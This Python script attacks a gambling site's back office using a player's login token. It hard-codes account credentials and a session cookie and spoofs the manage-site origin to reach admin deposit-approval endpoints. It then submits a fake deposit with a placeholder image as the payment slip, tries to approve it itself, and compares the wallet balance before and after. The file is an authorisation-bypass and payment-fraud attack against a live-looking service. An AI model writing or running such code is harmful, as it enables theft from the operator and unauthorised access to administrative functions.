#!/usr/bin/env python3
"""probe_approve_task.py — Hit real deposit approval task endpoints with player JWT.

   DISCOVERED from BO JS: real approval paths are:
   - /bo/auto-slip-deposit-assign-task/admin-do-task
   - /bo/auto-deposit-assign-task/admin-do-task
   - /bo/auto-slip-deposit-assign-task (GET — list tasks)
   - /bo/auto-deposit-assign-task (GET — list tasks)
   - /bo/auto-slip-deposit-assign-task/count
   - /bo/auto-deposit-assign-task/count

   Player JWT bypasses middleware crash (returns 404, not 401 ISE).
   These are the real paths so we may get past 404 to actual route handlers.
"""
import json, pathlib, requests, time, base64

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

# ── Re-auth to get fresh JWT ──────────────────────────────────────────────────
JWT_FILE = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2")

def decode_jwt(t):
    p = t.split(".")
    pad = p[1] + "=" * (-len(p[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(pad))

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached and decode_jwt(cached).get("exp", 0) - time.time() > 300:
        print(f"  [cached JWT] exp_in={(decode_jwt(cached)['exp']-time.time())/3600:.1f}h")
        return cached
    print("  Re-authing 0972571110:Pwned2026!...")
    r = requests.post(
        f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15,
    )
    if r.status_code in (200, 201) and "accessToken" in r.text:
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        print(f"  [!!!] JWT refreshed, exp_in=4h")
        return jwt
    raise RuntimeError(f"Auth failed: HTTP {r.status_code}: {r.text[:200]}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}",
       "Origin": "https://manage.vak88z2.com",
       "Referer": "https://manage.vak88z2.com/"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}")
print()

# ── 1. GET task counts (how many pending deposits are queued?) ─────────────────
print("=== 1. Pending task counts ===")
for path in [
    f"/bo/auto-slip-deposit-assign-task/count?domain={DOMAIN}",
    f"/bo/auto-deposit-assign-task/count?domain={DOMAIN}",
    f"/bo/auto-slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
    f"/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
    f"/bo/assign-task?domain={DOMAIN}&skip=0&limit=10",
]:
    r = requests.get(f"{BGAPI}{path}", headers=HDR, timeout=10)
    if r.status_code not in (401,):
        print(f"  [!!!] GET {path[:60]}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  GET ...{path[-40:]}: {r.status_code}")

# ── 2. POST admin-do-task (the real approval endpoint!) ───────────────────────
print("\n=== 2. POST admin-do-task (deposit approval) ===")
# From BO JS analysis, admin-do-task accepts an action + task ID
# Try to approve our own pending deposits
task_payloads = [
    # Approve action (guessing field names from BO context)
    {"domain": DOMAIN, "action": "approve"},
    {"domain": DOMAIN, "status": "approve", "action": "approve"},
    {"domain": DOMAIN, "approve_status": "success", "action": "approve"},
    # Empty (see what it asks for)
    {"domain": DOMAIN},
    # Try to pass our own deposit ID
]

for payload in task_payloads:
    for svc, base in [("bgapi", BGAPI), ("mgapi", MGAPI)]:
        for endpoint in [
            "/bo/auto-slip-deposit-assign-task/admin-do-task",
            "/bo/auto-deposit-assign-task/admin-do-task",
        ]:
            r = requests.post(f"{base}{endpoint}", headers=HDR, json=payload, timeout=10)
            if r.status_code not in (401, 404):
                print(f"  [!!!] [{svc}] POST {endpoint}: HTTP {r.status_code}: {r.text[:300]}")
            elif r.status_code == 404 and svc == "bgapi":
                # 404 on bgapi with player JWT = route doesn't exist as POST, or wrong method
                print(f"  [{svc}] POST {endpoint}: 404 (route missing)")
                break
    break  # Test first payload only to see responses, then decide

# ── 3. GET the task list — do our deposits appear? ────────────────────────────
print("\n=== 3. Task list exploration ===")
for path in [
    f"/bo/auto-slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=20",
    f"/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=20",
    f"/bo/assign-task?domain={DOMAIN}&status=pending&skip=0&limit=20",
    f"/bo/slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=20",
]:
    r = requests.get(f"{BGAPI}{path}", headers=HDR, timeout=10)
    if r.status_code != 401:
        print(f"  [!!!] {path[:60]}: HTTP {r.status_code}: {r.text[:400]}")
    else:
        print(f"  {path[-50:]}: 401")

# ── 4. PATCH endpoint (BO may use PATCH for approval) ─────────────────────────
print("\n=== 4. PATCH deposit endpoints ===")
for endpoint in [
    "/bo/auto-slip-deposit-assign-task",
    "/bo/auto-deposit-assign-task",
    "/bo/assign-task",
]:
    r = requests.patch(
        f"{BGAPI}{endpoint}",
        headers=HDR,
        json={"domain": DOMAIN, "action": "approve", "approve_status": "success"},
        timeout=10,
    )
    if r.status_code not in (401, 404, 405):
        print(f"  [!!!] PATCH {endpoint}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  PATCH {endpoint}: {r.status_code}")

# ── 5. Create a new deposit, get its ID, try to approve via task ───────────────
print("\n=== 5. Fresh deposit → task approval ===")
import uuid
slip_name = f"{uuid.uuid4()}.jpg"
# Sign URL
sr = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                   json={"filename": "slip.png", "content_type": "image/png", "size": 1024},
                   timeout=15)
dep_id = None
if sr.ok:
    slip_filename = sr.json().get("filename", "")
    upload_url = sr.json().get("urlUpload", "")
    # Upload minimal PNG
    minimal_png = (
        b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
        b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
        b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
    )
    if upload_url:
        requests.put(upload_url, headers={"Content-Type": "image/png"},
                     data=minimal_png, timeout=20)

    dep_r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                          json={"payment_bank_information_id": BANK_INFO,
                                "deposit_amount": 300, "deposit_account_id": DEP_ACCT,
                                "slip_image_url": slip_filename or slip_name,
                                "qr_string": ""},
                          timeout=15)
    if dep_r.ok:
        dep_id = dep_r.json().get("id", "")
        dep_status = dep_r.json().get("approve_status", "?")
        print(f"  Deposit created: id={dep_id} status={dep_status}")
    else:
        print(f"  Deposit create: HTTP {dep_r.status_code}: {dep_r.text[:100]}")

# Now try to approve it via task endpoint
if dep_id:
    print(f"  Trying to approve {dep_id[:8]} via task endpoints...")
    for endpoint in ["/bo/auto-slip-deposit-assign-task/admin-do-task",
                     "/bo/auto-deposit-assign-task/admin-do-task"]:
        for payload in [
            {"domain": DOMAIN, "deposit_transaction_id": dep_id, "action": "approve"},
            {"domain": DOMAIN, "id": dep_id, "action": "approve"},
            {"domain": DOMAIN, "task_id": dep_id, "approve": True},
            {"domain": DOMAIN, "deposit_id": dep_id, "approve_status": "success"},
        ]:
            r = requests.post(f"{BGAPI}{endpoint}", headers=HDR, json=payload, timeout=10)
            if r.status_code not in (401, 404):
                print(f"  [!!!] POST {endpoint}: {r.status_code}: {r.text[:300]}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
